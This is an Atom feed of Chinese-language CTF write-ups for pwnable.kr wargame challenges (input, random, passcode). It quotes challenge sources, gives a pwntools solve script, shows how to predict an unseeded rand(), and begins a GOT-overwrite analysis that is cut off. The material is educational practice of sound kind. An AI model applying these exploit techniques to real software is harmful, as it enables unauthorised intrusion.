<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ruom0</title>
  
  
  <link href="https://ruom0.github.io/atom.xml" rel="self"/>
  
  <link href="https://ruom0.github.io/"/>
  <updated>2021-06-04T09:45:00.662Z</updated>
  <id>https://ruom0.github.io/</id>
  
  <author>
    <name>ruom0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>input</title>
    <link href="https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/input/"/>
    <id>https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/input/</id>
    <published>2021-06-04T07:27:47.951Z</published>
    <updated>2021-06-04T09:45:00.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/input">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>获取flag需要过5关，类似拆炸弹游戏，需要5步才能拆除炸弹。</p><h3 id="Stage-1">Stage 1</h3><p>第1步要求如下：</p><ol><li>传入长度为100个字符。</li><li>字符&quot;A&quot;所代表ascii值位置的字符为<code>\x00</code>，字符&quot;B&quot;所代表位置的字符为<code>\x20\x0a\x0d</code></li></ol><p>这步比较简单，直接构造就行，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">argv = [<span class="string">&#x27;a&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>():</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Stage-2">Stage 2</h3><p>第2步要求如下：</p><ol><li>stdin的内容为<code>\x00\x0a\x00\xff</code></li><li>stderr的内容为<code>\x00\x0a\x02\xff</code></li></ol><p>若直接在process中添加<code>stdin = '\x00\x0a\x00\xff'和stderr = '\x00\x0a\x02\xff'</code>会产生报错，因为这里需要使用管道（pipe）。</p><p>创建管道的方法为：<code>r, w = os.pipe()</code>。</p><p>然后在管道中写入我们的数据即可。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r_in, w_in = os.pipe()</span><br><span class="line">r_err, w_err = os.pipe()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>():</span></span><br><span class="line">    os.write(w_in, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">    os.write(w_err, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Stage-3">Stage 3</h3><p>第3步是获取环境变量<code>\xde\xad\xbe\xef</code>的值，如果它等于<code>\xca\xfe\xba\xbe</code>则通过。</p><p>环境变量是一个字典，因此可以构造一个字典传入。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage3</span>():</span></span><br><span class="line">    env[<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>] = <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Stage-4">Stage 4</h3><p>第4步是从当前目录读入一个文件名是<code>\x0a</code>的文件，读4个字符判断是否为<code>\x00\x00\x00\x00</code>，那么直接创建文件写入即可。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage4</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Stage-5">Stage 5</h3><p>第5步是监听本机的端口，端口号是<code>argv</code>中字符&quot;C&quot;的ascii码位置所在的文本。若收到字符串<code>\xde\xad\xbe\xef</code>则通过。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, time</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage5</span>():</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">13145</span>))</span><br><span class="line">    s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>最终脚本源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, socket, time</span><br><span class="line"></span><br><span class="line">argv = [<span class="string">&#x27;a&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">r_in, w_in = os.pipe()</span><br><span class="line">r_err, w_err = os.pipe()</span><br><span class="line">env = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>():</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;13145&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>():</span></span><br><span class="line">    os.write(w_in, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">    os.write(w_err, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage3</span>():</span></span><br><span class="line">    env[<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>] = <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage4</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage5</span>():</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">13145</span>))</span><br><span class="line">    s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">stage1()</span><br><span class="line">stage2()</span><br><span class="line">stage3()</span><br><span class="line">stage4()</span><br><span class="line"></span><br><span class="line">p = process(executable = <span class="string">&#x27;./input&#x27;</span>, argv = argv, stdin = r_in, stderr = r_err, env = env)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">stage5()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>由于这个脚本需要传入argv、env、stdin、stderr并且还需要用socket发送消息，因此将脚本上传至服务器比较方便。</p><p>在pwnable.kr服务器中，/tmp目录权限为<code>rwxrwx-wt</code>，所以我们可以在/tmp下创建自己的目录，将脚本上传到该目录中。</p><p>由于input和flag文件都在/home/input2中，所以可以在自己创建的目录下做这两个文件的软链接来完成后续操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>random</title>
    <link href="https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/random/"/>
    <id>https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/random/</id>
    <published>2021-06-04T07:17:07.433Z</published>
    <updated>2021-06-04T07:26:46.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/random">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>程序取出随机数random，然后和输入的key异或，若结果等于0xdeadbeef，那么就输出flag。</p><p>仔细观察，发现没有设置随机数种子，那么就是伪随机。</p><p>在自己的linux机子或者在pwnable.kr服务器上写一个random.c，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();</span><br><span class="line">prinf(<span class="string">&quot;%u\n&quot;</span>, random ^ <span class="number">0xdeadbeef</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行得到key的值为<code>3039230856</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原题内容&quot;&gt;原题内容&lt;/h2&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
    
    
    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
    
    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>passcode</title>
    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/passcode/"/>
    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/passcode/</id>
    <published>2021-06-03T12:38:54.259Z</published>
    <updated>2021-06-03T13:22:49.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/passcode">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>题目开始进入函数<code>welcome</code>，输入最长100个字符的name值，可以看到并不会造成栈溢出。</p><p>继续看到<code>login</code>函数，很容易发现两个<code>scanf</code>函数的passcode变量均没有添加取地址符号，那么在<code>scanf</code>时会将passcode所指向的内存地址改变。（这点可能不是很明了，在后续的分析中可能会更容易理解一点，先记住这一点）</p><p>checksec结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/passcode/passcode&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>到这边似乎并没有什么思路，但是可以发现<code>RELRO</code>的值是<strong>Partial RELRO</strong>，说明该程序的GOT表可写。</p><p><code>objdump -R</code>查看GOT表结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">passcode:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC 